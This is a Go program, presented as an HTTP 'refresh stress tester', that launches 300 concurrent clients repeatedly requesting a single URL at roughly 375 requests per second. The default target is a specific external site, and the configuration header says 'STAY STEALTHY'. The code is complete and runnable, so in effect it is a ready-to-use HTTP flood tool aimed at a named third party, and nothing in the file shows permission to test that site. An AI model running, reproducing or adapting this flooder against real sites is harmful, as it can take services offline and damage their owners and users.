package main

import (
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"sync"
	"syscall"
	"time"
)

// ==========================================
// CONFIGURATION (STAY STEALTHY)
// ==========================================
var (
	SERVER_URL      = getEnv("TARGET_URL", "https://shrutibots.site/")
	TOTAL_CLIENTS   = 300          // Number of concurrent refresh clients
	MAX_WORKERS     = 300
	REFRESH_DELAY   = 80 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
)

// Worker Semaphore to limit max workers
var workerSemaphore = make(chan struct{}, MAX_WORKERS)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// ==========================================
// HELPERS
// ==========================================
func getEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}

// ==========================================
// CLIENT STRUCT
// ==========================================
type StressClient struct {
	clientID     int
	running      bool
	lastActivity time.Time
	lock         sync.Mutex
	httpClient   *http.Client
}

func NewStressClient(id int) *StressClient {
	return &StressClient{
		clientID: id,
		httpClient: &http.Client{
			Timeout: 15 * time.Second,
		},
	}
}

func (c *StressClient) DoRefresh() {
	c.lock.Lock()
	c.lastActivity = time.Now()
	c.lock.Unlock()

	targetURL := SERVER_URL

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		log.Printf("[Client %d] NewRequest failed: %v", c.clientID, err)
		return
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		log.Printf("[Client %d] Request error: %v", c.clientID, err)
		return
	}
	defer resp.Body.Close()

	// Consume body (simulates real browser, keeps connection alive for load balancer test)
	io.Copy(io.Discard, resp.Body)

	// Logging response headers like X-Cache can show if you hit or missed (Fastly specific)
	log.Printf("[Client %d] Page Refresh -> Status: %d | %s", c.clientID, resp.StatusCode, targetURL)
}

func (c *StressClient) Run() {
	c.running = true
	workerSemaphore <- struct{}{}
	defer func() { <-workerSemaphore }()

	for c.running {
		c.DoRefresh()
		time.Sleep(REFRESH_DELAY)
		runtime.Gosched()
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
	debug.SetMemoryLimit(850 * 1024 * 1024)
	runtime.GOMAXPROCS(runtime.NumCPU())

	log.Println("========================================")
	log.Println(" KING-CLAIMER HTTP REFRESH STRESS TESTER ")
	log.Printf(" Target: %s", SERVER_URL)
	log.Printf(" Clients: %d | Workers: %d | Delay: %v", TOTAL_CLIENTS, MAX_WORKERS, REFRESH_DELAY)
	log.Println(" Mode: Repeated page refresh")
	log.Println(" Purpose: Test regional routing + load balancing")
	log.Println("========================================")

	var wg sync.WaitGroup
	for i := 0; i < TOTAL_CLIENTS; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			client := NewStressClient(id)
			client.Run()
		}(i)
	}

	done := make(chan os.Signal, 1)
	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-done

	log.Println("Shutting down gracefully...")
	wg.Wait()
}
